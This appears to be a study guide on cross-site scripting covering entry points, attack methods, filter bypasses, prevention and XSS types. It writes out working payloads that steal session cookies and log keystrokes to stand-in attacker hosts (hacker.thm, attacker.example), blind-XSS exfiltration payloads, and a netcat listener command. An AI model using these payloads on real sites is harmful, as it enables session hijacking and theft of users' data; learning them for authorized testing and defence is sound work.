# Cross-Site Scripting (XSS)

A comprehensive guide to understanding, exploiting, and preventing Cross-Site Scripting (XSS) vulnerabilities.

## Definition

**XSS (Cross-Site Scripting)** is a JavaScript injection attack that allows attackers to inject malicious scripts into web applications. These scripts are then executed in the context of a user's browser, potentially compromising user data and session integrity.

## Why It Matters

XSS vulnerabilities can have severe consequences:
- **Session Compromise**: Attackers can steal user session cookies and hijack accounts
- **Data Theft**: Sensitive user information can be exfiltrated
- **Credential Harvesting**: Login credentials can be captured
- **Malware Distribution**: Malicious payloads can be delivered to users
- **Website Defacement**: Site content can be altered or manipulated
- **Privilege Escalation**: Administrative actions can be executed on behalf of legitimate users

## Entry Point

Entry points are locations where user input is incorporated into the web application without proper validation or sanitization:
- **URL Parameters**: Query strings and path parameters
- **Form Fields**: Text inputs, textareas, file uploads
- **Cookies**: Session data and stored preferences
- **HTTP Headers**: Referer, User-Agent, custom headers
- **Database Values**: User-generated content stored and reflected

## Attack Methods

### Proof of Concept
A basic XSS payload that demonstrates vulnerability:
```javascript
<script>alert('XSS');</script>
```

### Session Stealing
Exfiltrate user cookies to an attacker-controlled server:
```javascript
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

### Keylogger
Capture user keystrokes and send them to attacker:
```javascript
<script>
document.onkeypress = function(e) { 
  fetch('https://hacker.thm/log?key=' + btoa(e.key));
}
</script>
```

### Business Logic Abuse
Execute privileged functions on behalf of the user:
```javascript
<script>user.changeEmail('attacker@hacker.thm');</script>
```
This can be chained with password reset attacks using the attacker's email.

## Common Target Vectors

- Search bars and filters
- Comment sections
- User profile fields
- File upload displays
- Error messages
- URL parameters and anchors

## Vulnerable Functions

- `document.write()`
- `innerHTML`
- `eval()`
- Direct DOM manipulation without sanitization

## Bypass Techniques

- **Encoding Evasion**: Using different encodings (HTML, URL, UTF-8)
- **Case Variation**: `<ScRiPt>`, `<SCRIPT>`
- **Event Handlers**: `<img onerror="alert('XSS')">`, `<svg onload="...">`
- **Alternative Brackets**: Using HTML entities or Unicode equivalents

## Prevention Methods

- **Input Validation**: Whitelist allowed characters and patterns
- **Output Encoding**: Encode special characters based on context (HTML, JavaScript, URL)
- **Content Security Policy (CSP)**: Implement strict CSP headers to prevent inline script execution
- **Use Security Libraries**: Utilize established sanitization libraries
- **HTTPOnly Cookies**: Mark sensitive cookies as HttpOnly to prevent JavaScript access
- **Template Engines**: Use frameworks that auto-escape by default
- **Security Headers**: Implement X-XSS-Protection and other protective headers
- **Regular Security Audits**: Conduct code reviews and penetration testing

## XSS Types

### Reflected XSS
XSS payload is reflected back in the response through URL parameters or form inputs. The payload is not stored and is only executed in the victim's browser during that specific request.
```
Example: https://example.com/search?q=<script>alert('XSS')</script>
```

### Stored XSS
XSS payload is stored in the application database and executed whenever the page is accessed by any user. This is the most dangerous type as it can affect multiple users persistently.
```
Example: User posts malicious script in comment → stored in database → displayed to all users viewing that page
```

### DOM-Based XSS
Client-side JavaScript processes untrusted input and updates the DOM without proper sanitization. Vulnerabilities exist in how the client-side code handles user input.

### Blind XSS
The attacker cannot directly see the payload execution but uses techniques like **XSS Hunter** to detect when and where the XSS is triggered. Blind XSS is common in applications where input is processed later (background jobs, admin panels, ticketing systems).

#### Blind XSS — example payloads
In interfaces that render user input later (e.g., ticket/comment systems), an attacker may close the surrounding element and inject a callback to an attacker-controlled endpoint. Example payloads (for demonstration only):

```html
</textarea><script>
  fetch('https://attacker.example/collect?c=' + btoa(document.cookie));
</script>
```

Or a lightweight image beacon:

```html
</textarea><img src="https://attacker.example/collect?c=" onerror="this.src='https://attacker.example/collect?c='+encodeURIComponent(document.cookie)">
```

#### Listening for callbacks (demo)
On your listener machine you can use a simple TCP listener to observe incoming requests (example using `nc`/`netcat`):

```bash
nc -nlvp 8888
```

Notes:
- Use these techniques only in authorized, controlled testing environments.
- Prefer specialized services (like XSS Hunter) or intercepting proxies when performing safe testing.